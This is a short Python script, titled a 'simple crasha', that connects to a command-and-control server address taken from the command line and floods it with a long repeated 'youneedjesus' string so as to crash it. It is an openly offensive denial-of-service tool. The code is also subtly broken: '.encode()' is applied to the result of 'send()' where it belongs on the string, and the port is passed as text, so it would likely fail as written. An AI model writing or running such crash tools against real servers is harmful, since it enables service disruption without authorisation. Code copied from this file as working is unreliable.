#simple crasha made by sceil
import socket, os, time, sys
from os import system 

cncip = sys.argv[1]
cncport = sys.argv[2]

def crash(ip,port):
    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssock.settimeout(1)
    try: 
        ssock.connect((cncip,cncport))
        ssock.send('youneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesusyouneedjesus').encode()
        return True
    except:
        return False

def main():
    if crash(cncip,cncport):
        print("crashed")
    else:
        print("failed")

if __name__ == "__main__":
    main()
